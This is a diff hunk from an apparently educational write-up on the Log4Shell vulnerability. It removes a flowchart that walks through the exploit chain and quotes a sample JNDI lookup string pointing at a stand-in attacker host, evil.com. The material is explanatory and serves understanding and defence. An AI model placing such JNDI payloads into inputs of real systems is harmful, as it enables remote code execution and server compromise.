@@ -63,17 +63,6 @@ Here’s a simplified breakdown of the exploit chain:
    - Use the server as a pivot to attack other internal systems.
    - Launch cryptocurrency miners.
 
-```mermaid
-flowchart TD
-    A[Attacker Crafts Malicious String<br>e.g. ${jndi:ldap://evil.com/Exploit}] --> B[Submits string via any input<br>Search box, HTTP Header, Username, etc.]
-    B --> C{Vulnerable App<br>logs the string}
-    C --> D[Log4j parses the string<br>sees JNDI lookup command]
-    D --> E[Log4j sends request to<br>Attacker's LDAP Server evil.com]
-    E --> F[Attacker's LDAP server responds<br>with location of malicious Java class]
-    F --> G[Vulnerable App downloads<br>& executes the malicious class]
-    G --> H[Server Compromised<br>Ransomware, Data Theft, Backdoor]
-```
-
 ---
 
 ## 4. Why Was It So Dangerous?
